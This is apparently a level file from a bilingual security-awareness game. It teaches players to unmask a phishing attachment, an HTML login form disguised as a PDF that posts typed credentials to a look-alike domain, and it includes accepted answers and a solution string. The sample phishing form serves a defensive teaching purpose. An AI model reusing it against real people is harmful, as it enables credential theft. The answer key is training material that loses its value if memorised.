import type { LevelConfig } from '../../engine/schema';
import { ACT2, INBOX, PHISH } from './story';

const DL = `${ACT2.home}/Downloads`;

/** The "certificate": a credential-harvesting page saved with a .pdf name. */
const KIT = `<!DOCTYPE html>
<!-- kit v2.3 | ops: km -->
<html>
<head><title>Helix Dynamics - Sign in</title></head>
<body>
  <h2>Helix Dynamics Single Sign-On</h2>
  <p>Your VPN certificate has expired. Sign in to download the renewed certificate.</p>
  <form action="${ACT2.collect}" method="POST">
    <input name="user" placeholder="Username">
    <input name="pass" type="password" placeholder="Password">
    <button>Renew certificate</button>
  </form>
  <script>document.forms[0].user.value = "${ACT2.user}";</script>
</body>
</html>
`;

const level: LevelConfig = {
  id: 'L08',
  requires: { levels: ['L07'], evidence: ['ev.l07.domains'] },
  briefing: {
    en: 'The phishing email also carried a "certificate". Samir saved everything to Downloads. A file name is just a label anyone can type; the bytes inside decide what a file really is. Check every download in the terminal before you trust its name.',
    ar: 'إيميل التصيّد كان معه "شهادة" كمان. سمير حفظ كل إشي بـ Downloads. اسم الملف مجرد ملصق أي حدا بيقدر يكتبه؛ البايتات اللي جوّا هي اللي بتقرّر شو الملف فعلاً. افحص كل ملف بالطرفية قبل ما تصدّق اسمه.',
  },
  apps: ['case', 'mail', 'terminal', 'files', 'evidence'],
  autoOpen: ['case', 'terminal'],
  world: {
    user: ACT2.user,
    host: ACT2.host,
    home: ACT2.home,
    cwd: DL,
    now: ACT2.now,
    emails: [PHISH, ...INBOX],
    files: {
      [`${DL}/${ACT2.attachment}`]: { content: KIT, mtime: '2026-03-12T22:44:00Z' },
      [`${DL}/Backup-Report-2026-02.pdf`]: { content: '%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n', mtime: '2026-03-11T07:05:00Z' },
      [`${DL}/helix-vpn-client.deb`]: { content: '!<arch>\ndebian-binary   1710000000  0     0     100644  4         `\n2.0\n', mtime: '2026-02-20T10:00:00Z' },
      [`${DL}/team-offsite.jpg`]: { content: '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01', mtime: '2026-01-30T18:00:00Z' },
      [`${DL}/notes.txt`]: { content: 'cert renewal -> ask IT? they said it was automatic\n', mtime: '2026-03-12T22:50:00Z' },
    },
  },
  objectives: [
    {
      id: 'inspect',
      prompt: {
        en: 'In the terminal, check what the files in ~/Downloads REALLY are, by content instead of name.',
        ar: 'بالطرفية، افحص شو ملفات ~/Downloads فعلاً، حسب المحتوى مش الاسم.',
      },
      validator: { kind: 'command', pattern: '^file\\s+\\S' },
    },
    {
      id: 'liar',
      prompt: { en: 'Which download claims to be a PDF but is not?', ar: 'أي ملف بيدّعي إنه PDF وهو مش هيك؟' },
      placeholder: 'file name',
      validator: { kind: 'answer', accept: [ACT2.attachment, `${DL}/${ACT2.attachment}`, `~/Downloads/${ACT2.attachment}`] },
      wrong: {
        en: 'Both .pdf files have the same extension. Only one starts with %PDF: compare what `file` says for each.',
        ar: 'الملفين .pdf إلهم نفس الامتداد. واحد بس بيبلّش بـ %PDF: قارن شو بيقول `file` عن كل واحد.',
      },
    },
    {
      id: 'collect',
      prompt: {
        en: 'Read it (`cat`). Where does it send the username and password you type?',
        ar: 'اقرأه (`cat`). لوين بيبعث اسم المستخدم وكلمة السر اللي بتكتبهم؟',
      },
      placeholder: 'https://…',
      validator: { kind: 'answer', accept: [ACT2.collect, ACT2.collect.replace('https://', '')] },
      wrong: {
        en: 'Look for the <form> tag: its action attribute is where the data goes.',
        ar: 'دوّر على وسم <form>: خاصية action فيه هي وين بتروح البيانات.',
      },
      grants: [
        {
          id: 'ev.l08.kit',
          title: { en: 'Credential-harvesting attachment', ar: 'مرفق سرقة بيانات الدخول' },
          type: 'file',
          content: `${ACT2.attachment} = HTML login form posting to ${ACT2.collect}`,
          links: ['ev.l07.domains'],
        },
      ],
    },
    {
      id: 'response',
      prompt: { en: 'What should Samir have done with this attachment?', ar: 'شو كان لازم سمير يعمل بهالمرفق؟' },
      validator: {
        kind: 'choice',
        correct: 'report',
        options: [
          { id: 'browser', label: { en: 'Open it in a different browser to be safe', ar: 'يفتحه بمتصفح ثاني ليكون بأمان' } },
          { id: 'forward', label: { en: 'Forward it to colleagues to ask if it looks real', ar: 'يبعثه لزملائه يسألهم إذا شكله حقيقي' } },
          { id: 'report', label: { en: 'Report it to security without opening it', ar: 'يبلّغ عنه الأمن بدون ما يفتحه' } },
          { id: 'reply', label: { en: 'Reply to the sender and ask if it is legitimate', ar: 'يرد على المرسل ويسأله إذا هو حقيقي' } },
        ],
      },
      wrong: {
        en: 'Opening, forwarding and replying all help the attacker. Reply-To goes to the look-alike domain.',
        ar: 'الفتح والتحويل والرد كلهم بيساعدوا المهاجم. و Reply-To بيروح للنطاق الشبيه.',
      },
    },
  ],
  hints: [
    {
      tier: 'nudge',
      text: { en: '`man file`. The file command reads the first bytes (the "magic") instead of trusting the extension.', ar: '`man file`. أمر file بيقرأ أول البايتات ("التوقيع") بدل ما يصدّق الامتداد.' },
      cost: 15,
    },
    {
      tier: 'direction',
      text: { en: 'Run `file *` inside ~/Downloads. One ".pdf" is reported as HTML.', ar: 'شغّل `file *` جوّا ~/Downloads. واحد من ملفات ".pdf" بيطلع HTML.' },
      cost: 30,
    },
    {
      tier: 'near-solution',
      text: {
        en: '`cat VPN-Certificate-Renewal.pdf` and copy the URL in action="…".',
        ar: '`cat VPN-Certificate-Renewal.pdf` وانسخ الرابط اللي بـ action="…".',
      },
      cost: 50,
    },
  ],
  intel: {
    id: 'intel.l08.signature',
    text: {
      en: 'The kit carries a signature comment: "ops: km". Keep it in mind.',
      ar: 'الحزمة فيها تعليق توقيع: "ops: km". خلّيه ببالك.',
    },
  },
  rewards: { points: 140 },
  debrief: {
    concept: {
      en: 'Operating systems pick an app by extension, but the extension is part of the name and proves nothing. Real formats start with "magic bytes": %PDF for PDF, \\x89PNG for PNG, MZ for Windows programs. HTML attachments are a favorite phishing trick: they open in the browser, look like a real login page, and post whatever you type to the attacker, without any link for filters to scan.',
      ar: 'أنظمة التشغيل بتختار التطبيق حسب الامتداد، بس الامتداد جزء من الاسم وما بيثبت إشي. الصيغ الحقيقية بتبلّش "ببايتات سحرية": %PDF للـ PDF، و \\x89PNG للـ PNG، و MZ لبرامج ويندوز. مرفقات HTML حيلة مفضّلة بالتصيّد: بتنفتح بالمتصفح، شكلها صفحة دخول حقيقية، وبتبعث أي إشي بتكتبه للمهاجم، بدون أي رابط تقدر الفلاتر تفحصه.',
    },
    realTools: ['file', 'TrID', 'VirusTotal (hash lookup)', 'mail gateway attachment filtering'],
    takeaway: {
      en: 'Trust content, not names. Block or quarantine HTML attachments at the mail gateway.',
      ar: 'صدّق المحتوى مش الأسماء. احظر أو اعزل مرفقات HTML على بوابة البريد.',
    },
    source: 'MITRE ATT&CK T1566.001 (Spearphishing Attachment); file(1) magic database',
  },
  echo: {
    intro: {
      en: 'A certificate that needs your password is not a certificate. Let the bytes tell you what it is.',
      ar: 'شهادة بتطلب كلمة سرّك مش شهادة. خلّي البايتات تحكيلك شو هي.',
    },
    success: {
      en: 'A login page in a PDF costume. Whatever Samir typed went straight to helixdynamlcs.example.',
      ar: 'صفحة دخول لابسة زي PDF. أي إشي كتبه سمير راح مباشرة على helixdynamlcs.example.',
    },
  },
  solution: 'cd ~/Downloads (already cwd); file * -> VPN-Certificate-Renewal.pdf: HTML document. cat it -> form action https://helixdynamlcs.example/collect.php. Choice: report.',
  selfTest: [
    { run: 'file *', includes: `${ACT2.attachment}: HTML document` },
    { run: 'file Backup-Report-2026-02.pdf', includes: 'PDF document' },
    { run: `cat ${ACT2.attachment}`, includes: ACT2.collect },
  ],
};

export default level;
